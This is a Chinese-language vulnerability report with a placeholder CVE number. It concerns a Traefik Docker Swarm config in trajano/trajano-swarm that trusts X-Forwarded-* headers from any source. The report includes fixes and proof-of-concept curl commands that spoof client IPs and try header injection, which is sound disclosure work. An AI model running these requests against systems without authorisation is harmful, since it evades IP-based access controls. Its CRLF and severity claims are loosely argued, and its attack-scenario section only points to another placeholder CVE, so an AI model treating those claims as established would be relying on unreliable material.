# CVE-2025-XXXXX: HTTP Header Injection in trajano/trajano-swarm Traefik Configuration

## 基本信息

- **CVE ID**: CVE-2025-XXXXX (待分配)
- **项目**: trajano/trajano-swarm
- **发现日期**: 2025-12-28
- **报告者**: Security Research
- **严重程度**: High (CVSS 7.5)

## 漏洞描述

trajano/trajano-swarm 项目中的 Traefik Docker Swarm 配置存在 HTTP Header Injection (CRLF Injection) 漏洞。配置文件中设置了 `forwardedHeaders.insecure` 但没有配置 `trustedIPs` 白名单，导致 Traefik 信任所有来源的 X-Forwarded-* 头。

## 受影响文件

- `intranet.yml`

## 漏洞配置

```yaml
command:
  - "--entryPoints.http.forwardedHeaders.insecure"
```

## 漏洞详情

### 问题分析

1. **配置问题**: `forwardedHeaders.insecure` 且**没有配置 trustedIPs**
2. **影响**: Traefik 会信任**所有来源**的 X-Forwarded-* 头
3. **攻击向量**: 攻击者可以直接向 Traefik 发送恶意请求

### 攻击场景

同 CVE-2025-XXXXX-hmcts-cnp-flux-config

## 影响评估

### CVSS 3.1 评分

- **Base Score**: 7.5 (High)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N

### 实际影响

1. **日志注入** ✅ **几乎肯定发生**
2. **IP 欺骗** ✅ **很可能发生**
3. **响应拆分** ⚠️ **可能发生**

## 修复建议

### 方案 1: 移除 insecure 配置（推荐）

```yaml
# 移除这一行
# - "--entryPoints.http.forwardedHeaders.insecure"
```

### 方案 2: 配置 trustedIPs 白名单

```yaml
command:
  - "--entryPoints.http.forwardedHeaders.insecure"
  - "--entryPoints.http.forwardedHeaders.trustedIPs=10.0.0.0/8,172.16.0.0/12,192.168.0.0/16"
```

## 漏洞复现

### 环境准备

1. **克隆项目仓库**:
   ```bash
   git clone https://github.com/trajano/trajano-swarm.git
   cd trajano-swarm
   ```

2. **检查漏洞配置**:
   ```bash
   # 查看 intranet.yml 中的 Traefik 配置
   cat intranet.yml | grep -A 10 "traefik:" | grep -A 5 "command"
   ```

3. **部署到 Docker Swarm**:
   ```bash
   # 初始化 Swarm（如果还没有）
   docker swarm init

   # 部署服务
   docker stack deploy -c intranet.yml intranet
   ```

### 漏洞复现步骤

#### 步骤 1: 确认 Traefik 配置

```bash
# 检查 Traefik 服务配置
docker service inspect intranet_traefik --pretty | grep -A 10 "Command"

# 应该看到包含：
# "--entryPoints.http.forwardedHeaders.insecure"
# 但没有 trustedIPs 配置
```

#### 步骤 2: 测试日志注入漏洞

```bash
# 获取 Traefik 服务地址
TRAEFIK_IP=$(docker service ps intranet_traefik --format "{{.Node}}" | head -1 | xargs docker node inspect --format '{{.Status.Addr}}')

# 或者使用服务名称（如果配置了 DNS）
TRAEFIK_HOST="traefik"

# 基础日志注入
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-Proto: https" \
     -H "X-Injected-Header: malicious-value" \
     http://$TRAEFIK_HOST:80/

# CRLF 注入
curl -v -H "X-Forwarded-For: 127.0.0.1%0D%0AX-Log-Injection: CRLF-TEST" \
     http://$TRAEFIK_HOST:80/
```

#### 步骤 3: 测试 IP 欺骗漏洞

```bash
# 伪造本地 IP
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: 127.0.0.1" \
     http://$TRAEFIK_HOST:80/

# 伪造内网 IP
curl -v -H "X-Forwarded-For: 10.0.0.1" \
     http://$TRAEFIK_HOST:80/
```

#### 步骤 4: 验证漏洞

```bash
# 查看 Traefik 服务日志
docker service logs intranet_traefik --tail 50

# 查看后端服务日志（假设有后端服务）
docker service logs intranet_backend --tail 50 | grep -i "forwarded"
```

### 预期结果

- 后端服务日志中包含注入的恶意内容
- 后端服务记录的 IP 地址是伪造的
- Traefik 没有验证 X-Forwarded-* 头的来源

### 自动化测试脚本

```bash
#!/bin/bash
TRAEFIK_HOST="traefik"  # 或使用实际 IP

echo "[*] Testing HTTP Header Injection in Docker Swarm"
echo "[*] Target: $TRAEFIK_HOST:80"

curl -s -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Injected-Test: vulnerability-exists" \
     http://$TRAEFIK_HOST:80/ > /dev/null

echo "[*] Check service logs: docker service logs intranet_traefik"
```

## 备注

这是 Docker Swarm 配置，可能用于生产环境。建议尽快修复。

